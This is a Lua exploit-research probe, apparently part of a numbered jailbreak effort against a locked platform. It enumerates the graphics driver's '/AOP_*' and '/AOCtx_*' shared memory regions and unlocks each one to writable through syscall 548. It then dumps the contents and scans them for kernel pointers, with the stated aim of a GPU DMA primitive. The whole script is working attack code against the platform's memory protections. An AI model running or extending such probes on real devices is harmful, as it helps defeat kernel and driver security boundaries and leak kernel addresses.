-- CRASH_CLASS: LOW
-- PROBE 1527a: the /AO* shared regions -- enumerate, unlock with 548 op 2, dump
--
-- -- prior art:
--   probes/phase36_realargs/1489a_ao_shared_prot.lua
--     results/phase36_realargs/1489a_ao_shared_prot_20261109_215505.txt
--     -> exactly one shared-flag entry was found by name (`./AOSharedState`, 0x310D80000, len
--        0x8000, prot 1, flags 0xC) and 548 op 2 raised it to prot 3 and restored it to 1.
--   probes/phase36_realargs/1489b_ao_shared_write.lua
--     results/phase36_realargs/1489b_ao_shared_write_20261109_215541.txt
--     -> after op 2 a store of DEAD1234 CAFEBABE 55667788 99AABBCC at +0x100 read back, and it
--        was still there after the protection was restored to 1. So the write really lands.
--   probes/phase36_realargs/1489c_ao_state_persist.lua
--     -> after a relaunch AOSharedState is regenerated per process, so it is not a
--        cross-process channel.
--   probes/phase36_realargs/1481f_full_map_dump.lua
--     results/phase36_realargs/1481f_full_map_dump_20261109_201845.txt
--     -> the /AO* family is far larger than AOSharedState: `/AOP_0000000087_C000..C006_P00`
--        (0x10000 each), `/AOCtx_0000000087_*` (0x4000 each) and `/AOCtx_0000000087_ko675L`
--        at 0x200F6C000, all with entry flags 0xC.
--   probes/phase36_realargs/1481e_device_alias_test.lua -- the device windows are not aliases
--     of executable memory, so a dump here is the only way to learn what these regions hold.
--
-- Why: 1489a/1489b only ever looked at the single entry whose name is literally AOSharedState.
-- The /AOP_* and /AOCtx_* entries are the graphics driver's shared page tables and per-context
-- state. If any of them is a command or ring buffer that the GPU consumes, writing into it is a
-- route to a GPU DMA primitive without any kernel read. Nothing in this tree has ever dumped
-- them, because until 548 op 2 they were read-only.
--
-- Method: one 674 pass, keep every record whose name contains "/AO", sort by address, then for
-- each: read what it says before, raise to prot 3 with 548 op 2, dump 96 dwords, restore the
-- original protection, and report any dword that looks like a kernel pointer. Print before every
-- call so a truncated capture names the region that died.

print("=== PROBE 1527a: /AO* SHARED REGIONS ===")
print("")

local function N(v)
    if type(v) == "number" then return v end
    if type(v) == "table" and v.tonumber then
        local ok, n = pcall(function() return v:tonumber() end)
        if ok and n then return n end
    end
    local ok, n = pcall(function() return tonumber(v) end)
    if ok and n then return n end
    return 0
end
local function mk(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) % 4294967296 end
    return nil
end
local function rdq(a)
    local lo = rd(a)
    local hi = rd(a + 4)
    if not lo or not hi then return nil end
    return hi * 4294967296 + lo
end
local function wd(a, v)
    return pcall(function() memory.write_dword(a, uint64(v % 4294967296)) end)
end
local function sid(v)
    local n = N(v)
    if n < 0 then n = n + 2 ^ 64 end
    return n
end
local function self_pid()
    local ok, v = pcall(function() return getpid() end)
    if ok then return N(v) end
    return -1
end
local function name_at(rec, maxlen)
    local s = ""
    for i = 0, maxlen - 1 do
        local ok, b = pcall(function() return memory.read_byte(rec + 0x21 + i) end)
        if not ok then break end
        local c = N(b) % 256
        if c == 0 then break end
        if c >= 32 and c < 127 then s = s .. string.char(c) else s = s .. "." end
    end
    return s
end
local function kshape(v)
    if not v then return false end
    local hi = math.floor(v / 4294967296)
    return hi >= 0xFFFF8000 and hi < 0xFFFFFFFF
end

print("pid=" .. tostring(self_pid()))

-- ============================================================
-- [A] full 674 map, keep the /AO* records
-- ============================================================
print("")
print("[A] 674 full map, filtering names containing /AO")
local MAXR = 400
local buf = memory.alloc(MAXR * 72 + 0x40)
local ba = N(buf)
if ba < 0x10000 then print("  FAIL: no buffer"); return end
for off = 0, MAXR * 72, 8 do pcall(function() memory.write_qword(ba + off, 0) end) end
local cnt = memory.alloc(0x10)
local ca = N(cnt)
wd(ca, 0)

local okA, rvA = pcall(function()
    return mk(674)(uint64(ba), uint64(72), uint64(MAXR), uint64(ca), uint64(0x40000000), uint64(0))
end)
print("  674 rv=" .. tostring(okA and N(rvA) or "EXC") .. "  count=" .. tostring(rd(ca)))
local nrec = rd(ca) or 0
if nrec > MAXR then nrec = MAXR end
if nrec == 0 then print("  FAIL: 674 returned no records"); return end

local aos = {}
for i = 0, nrec - 1 do
    local rec = ba + i * 72
    local s = rdq(rec + 0x00)
    local e = rdq(rec + 0x08)
    local prot = rd(rec + 0x18) or 0
    local nm = name_at(rec, 40)
    if nm:find("/AO") then
        aos[#aos + 1] = { s = s, e = e, prot = prot, name = nm }
    end
end
print("  " .. tostring(#aos) .. " /AO* records out of " .. tostring(nrec))
table.sort(aos, function(a, b) return a.s < b.s end)
for i, r in ipairs(aos) do
    print(string.format("  [%2d] %s  len=0x%-8X prot=0x%X  %s", i, string.format("0x%X", r.s), r.e - r.s, r.prot, r.name))
end

-- ============================================================
-- [B] 548 entry writer
-- ============================================================
local ent = memory.alloc(0x40)
local ea = N(ent)
local done = memory.alloc(0x10)
local da = N(done)
local function set_entry(start, length, prot)
    for i = 0, 0x38, 8 do pcall(function() memory.write_qword(ea + i, 0) end) end
    pcall(function() memory.write_qword(ea + 0x00, uint64(start)) end)
    pcall(function() memory.write_qword(ea + 0x08, uint64(0)) end)
    pcall(function() memory.write_qword(ea + 0x10, uint64(length)) end)
    wd(ea + 0x18, prot)
    pcall(function() memory.write_byte(ea + 0x1C, 2) end)
end
local function batch(flags)
    wd(da, 0xEEEEEEEE)
    local ok, rv = pcall(function()
        return mk(548)(uint64(0), uint64(flags), uint64(ea), uint64(1), uint64(da), uint64(0))
    end)
    if not ok then return -999, nil end
    return N(rv), rd(da)
end

-- ============================================================
-- [C] per region: read before, unlock, dump, restore
-- ============================================================
print("")
print("[C] unlock each region to prot 3 and dump 96 dwords")
for i, r in ipairs(aos) do
    local first = r.s
    local len = 0x4000
    if r.e and r.e > first + 0x4000 then len = 0x4000 end
    print("")
    print(string.format("[%d] %s prot=0x%X len=0x%X", i, string.format("0x%X", first), r.prot, len))
    local v0 = rd(first)
    print("    before: " .. (v0 and string.format("%08X", v0) or "FAULT"))

    -- raise to 3
    set_entry(first, len, 3)
    print("    protect -> 3: calling")
    local rv1, pr1 = batch(0)
    print("    rv=" .. tostring(rv1) .. " processed=" .. tostring(pr1))

    local words = {}
    local bad = 0
    for j = 0, 0x80 - 1 do
        local v = rd(first + j * 4)
        words[j] = v
        if not v then bad = bad + 1 end
    end
    print("    unreadable dwords: " .. tostring(bad))
    if bad < 0x80 then
        for row = 0, 11 do
            local line = string.format("    +0x%03X:", row * 0x20)
            for c = 0, 7 do
                local v = words[row * 8 + c]
                line = line .. " " .. (v and string.format("%08X", v) or "????????")
            end
            print(line)
        end
        local kph = 0
        local firstk = nil
        for j = 0, 0x7E do
            local lo, hi = words[j], words[j + 1]
            if lo and hi and lo ~= 0 and hi then
                if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF and lo >= 0x10000 then
                    kph = kph + 1
                    if not firstk then firstk = string.format("+0x%03X = %08X%08X", j * 4, hi, lo) end
                end
            end
        end
        print("    kernel-shaped qwords: " .. tostring(kph) .. (firstk and ("  first " .. firstk) or ""))
    end

    -- restore
    if r.prot ~= 3 then
        set_entry(first, len, r.prot)
        print("    restore -> " .. string.format("0x%X", r.prot) .. ": calling")
        local rv2, pr2 = batch(0)
        print("    rv=" .. tostring(rv2) .. " processed=" .. tostring(pr2))
        print("    after restore: " .. tostring(rd(first) and string.format("%08X", rd(first)) or "FAULT"))
    end
end

print("")
print("pid_final=" .. tostring(self_pid()))
print("")
print("=== PROBE 1527a COMPLETE ===")
